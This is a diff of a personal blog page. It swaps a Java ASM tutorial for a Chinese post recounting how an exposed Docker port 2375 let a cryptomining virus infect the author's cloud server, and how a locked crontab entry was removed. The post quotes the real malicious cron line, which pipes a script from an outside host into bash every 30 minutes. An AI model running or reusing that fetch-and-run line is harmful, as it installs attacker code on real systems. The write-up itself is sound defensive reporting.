@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="用ASM写一个HelloWorld, ColdRain&#39;s Blog">
-    <meta name="description" content="尝试了一下asm库，用它生成了一个helloworld的代码">
+    <meta name="keywords" content="记一次服务器遭到挖矿病毒感染的经历, ColdRain&#39;s Blog">
+    <meta name="description" content="2375端口真不能开，开了就中招">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>用ASM写一个HelloWorld | ColdRain&#39;s Blog</title>
+    <title>记一次服务器遭到挖矿病毒感染的经历 | ColdRain&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -248,12 +248,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">用ASM写一个HelloWorld</h1>
+                    <h1 class="description center-align post-title">记一次服务器遭到挖矿病毒感染的经历</h1>
                 </div>
             </div>
         </div>
@@ -369,16 +369,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Java/">
-                                <span class="chip bg-color">Java</span>
-                            </a>
-                        
-                            <a href="/tags/%E5%A4%96%E9%83%A8%E5%BA%93/">
-                                <span class="chip bg-color">外部库</span>
-                            </a>
-                        
-                            <a href="/tags/ASM/">
-                                <span class="chip bg-color">ASM</span>
+                            <a href="/tags/%E8%BF%90%E7%BB%B4/">
+                                <span class="chip bg-color">运维</span>
                             </a>
                         
                     </div>
@@ -389,8 +381,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category">
-                                笔记
+                            <a href="/categories/%E6%9D%82%E8%B0%88/" class="post-category">
+                                杂谈
                             </a>
                         
                     </div>
@@ -402,28 +394,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-10-11
+                    2022-05-17
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-11-14
+                    2022-05-17
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    205
+                    529
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -446,37 +438,36 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="用ASM写一个HelloWorld"><a href="#用ASM写一个HelloWorld" class="headerlink" title="用ASM写一个HelloWorld"></a>用ASM写一个HelloWorld</h1><p>今天上计算机应用能力课的时候太无聊，简单的研究了一下ASM，用ASM生成了一个含有HelloWorld的类<br>不得不说，ASM是真的黑魔法</p>
-<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">public</span> <span class="token keyword">class</span> ASMTest <span class="token punctuation">{</span>
+                <h1 id="记一次服务器遭到挖矿病毒感染的经历"><a href="#记一次服务器遭到挖矿病毒感染的经历" class="headerlink" title="记一次服务器遭到挖矿病毒感染的经历"></a>记一次服务器遭到挖矿病毒感染的经历</h1><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在鼓捣docker，看了一些教程，为了方便一些操作打开了2375端口，导致被人docker注入了。</p>
+<h2 id="应对过程"><a href="#应对过程" class="headerlink" title="应对过程"></a>应对过程</h2><p>其实我之前完全没有面对过服务器遭到病毒攻击的问题…最开始是腾讯云给我发短信，说我的服务器存在危险行为，并且封禁了这台服务器一天。</p>
+<p>当时一上去我就感觉到不对了，服务器上经常莫名奇妙多一个docker镜像，删了也没用。</p>
+<p>后面我使用<code>crontab -l</code>排查了一下定时任务，发现里面有一个奇怪的任务。</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">*/30 * * * * /usr/bin/cdz -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | bash &gt; /dev/null 2&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-    <span class="token keyword">public</span> static void <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> throws NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException<span class="token punctuation">,</span> IllegalAccessException <span class="token punctuation">{</span>
-        byte<span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        MyClassLoader cl <span class="token operator">=</span> new <span class="token function">MyClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">&gt;</span> clazz <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token string">"team.redrock.coldrain.asmtest.HelloWorldASM"</span><span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        Method m <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">,</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>class<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        m<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> new Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>new String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
+<p>看样子这就是问题所在了，它会定时下载一个脚本文件并且执行。那么只要把它删掉不就完事大吉了？</p>
+<p>于是我试图用<code>crontab -e</code>删掉它，最后却发现无法编辑这个配置。</p>
+<blockquote>
+<p>“/tmp/crontab.Awo30z” 1L, 1C written<br>crontab: installing new crontab<br>/var/spool/cron/#tmp.VM-16-8-centos.XXXX6iXbXz: Operation not permitted<br>crontab: edits left in /tmp/crontab.Awo30z</p>
+</blockquote>
+<p>病毒怎么可能会让你轻松的删掉这个定时任务？它修改了文件的属性，让它无法被修改——即便你拥有root的最高权限。</p>
+<p>百度后找到了解决方案</p>
+<blockquote>
+<p> 查看是否有特殊的属性 lsattr /var/spool/cron/ </p>
+<p> 去掉特殊的属性 chattr -ai /var/spool/cron/root  &amp;&amp; lsattr /var/spool/cron/root</p>
+</blockquote>
+<p>但是有一点很奇怪，我的腾讯云机器上无法使用chattr指令。他会询问我是否安装一个包，但真安装时却说这个包已经安装过了，不知道这是不是病毒搞得鬼。</p>
+<blockquote>
+<p>[root@VM-16-8-centos lighthouse]# chattr -i /var/spool/cron<br>bash: chattr: command not found…<br>Install package ‘e2fsprogs’ to provide command ‘chattr’? [N/y] y  </p>
+<ul>
+<li>Waiting in queue… Failed to install packages: e2fsprogs-1.45.6-2.tl3.x86_64 is already installed</li>
+</ul>
+</blockquote>
+<p>于是我把包给卸载重装了一次，就可以了</p>
+<blockquote>
+<p>yum remove e2fsprogs-1.45.6-2.tl3.x86_64</p>
+</blockquote>
+<p>去除特殊权限后就可以编辑定时任务了。</p>
 
-    static byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        ClassWriter cw <span class="token operator">=</span> new <span class="token function">ClassWriter</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        cw<span class="token punctuation">.</span><span class="token function">visit</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>V1_8<span class="token punctuation">,</span> Opcodes<span class="token punctuation">.</span>ACC_PUBLIC<span class="token punctuation">,</span> <span class="token string">"team/redrock/coldrain/asmtest/HelloWorldASM"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"java/lang/Object"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        MethodVisitor mv <span class="token operator">=</span> cw<span class="token punctuation">.</span><span class="token function">visitMethod</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>ACC_PUBLIC <span class="token operator">+</span> Opcodes<span class="token punctuation">.</span>ACC_STATIC<span class="token punctuation">,</span> <span class="token string">"main"</span><span class="token punctuation">,</span> <span class="token string">"([Ljava/lang/String;)V"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        mv<span class="token punctuation">.</span><span class="token function">visitFieldInsn</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>GETSTATIC<span class="token punctuation">,</span> <span class="token string">"java/lang/System"</span><span class="token punctuation">,</span> <span class="token string">"out"</span><span class="token punctuation">,</span> <span class="token string">"Ljava/io/PrintStream;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        mv<span class="token punctuation">.</span><span class="token function">visitLdcInsn</span><span class="token punctuation">(</span><span class="token string">"Hello ASM!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        mv<span class="token punctuation">.</span><span class="token function">visitMethodInsn</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>INVOKEVIRTUAL<span class="token punctuation">,</span> <span class="token string">"java/io/PrintStream"</span><span class="token punctuation">,</span> <span class="token string">"println"</span><span class="token punctuation">,</span> <span class="token string">"(Ljava/lang/String;)V"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        mv<span class="token punctuation">.</span><span class="token function">visitInsn</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>RETURN<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        mv<span class="token punctuation">.</span><span class="token function">visitMaxs</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        mv<span class="token punctuation">.</span><span class="token function">visitEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        cw<span class="token punctuation">.</span><span class="token function">visitEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> cw<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-
-    static <span class="token keyword">class</span> MyClassLoader extends ClassLoader <span class="token punctuation">{</span>
-        <span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">&gt;</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> byte<span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-            <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
                 
             </div>
             <hr/>
@@ -502,7 +493,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://blog.coldrain.ink/2021/10/11/hello-asm/">http://blog.coldrain.ink/2021/10/11/hello-asm/</a>
+                    <a href="http://blog.coldrain.ink/2022/05/17/deal-with-viruses-in-the-server/">http://blog.coldrain.ink/2022/05/17/deal-with-viruses-in-the-server/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -540,16 +531,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Java/">
-                                    <span class="chip bg-color">Java</span>
-                                </a>
-                            
-                                <a href="/tags/%E5%A4%96%E9%83%A8%E5%BA%93/">
-                                    <span class="chip bg-color">外部库</span>
-                                </a>
-                            
-                                <a href="/tags/ASM/">
-                                    <span class="chip bg-color">ASM</span>
+                                <a href="/tags/%E8%BF%90%E7%BB%B4/">
+                                    <span class="chip bg-color">运维</span>
                                 </a>
                             
                         </div>
@@ -861,29 +844,30 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/10/12/my-first-web-page/">
+                <a href="/2022/05/17/deal-with-viruses-in-the-server/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="尝试用CSS/Html写了自己的第一个网站">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="记一次服务器遭到挖矿病毒感染的经历">
                         
-                        <span class="card-title">尝试用CSS/Html写了自己的第一个网站</span>
+                        <span class="card-title">记一次服务器遭到挖矿病毒感染的经历</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            利用红岩前端学来的知识写了个个人主页
+                            2375端口真不能开，开了就中招
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-17
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -896,11 +880,12 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%89%8D%E7%AB%AF/">
-                        <span class="chip bg-color">前端</span>
+                    <a href="/tags/%E8%BF%90%E7%BB%B4/">
+                        <span class="chip bg-color">运维</span>
                     </a>
                     
                 </div>
@@ -914,31 +899,31 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/09/28/taboolib6-packet-control/">
+                <a href="/2022/02/23/do-some-subtraction-to-my-life/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="利用TabooLib6发送/拦截/修改数据包以实现梦想中的特性">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="为人生做些减法">
                         
-                        <span class="card-title">利用TabooLib6发送/拦截/修改数据包以实现梦想中的特性</span>
+                        <span class="card-title">为人生做些减法</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            写了一篇TabooLib数据包控制技巧的教程
+                            人生应该有所取舍，有所取则应有所舍
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-28
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-23
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%95%99%E7%A8%8B/" class="post-category">
-                                    教程
+                            <a href="/categories/%E4%BA%BA%E7%94%9F%E6%84%9F%E6%82%9F/" class="post-category">
+                                    人生感悟
                                 </a>
                             
                             
@@ -948,12 +933,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Kotlin/">
-                        <span class="chip bg-color">Kotlin</span>
-                    </a>
-                    
-                    <a href="/tags/TabooLib/">
-                        <span class="chip bg-color">TabooLib</span>
+                    <a href="/tags/%E4%BA%BA%E7%94%9F%E6%84%9F%E6%82%9F/">
+                        <span class="chip bg-color">人生感悟</span>
                     </a>
                     
                 </div>
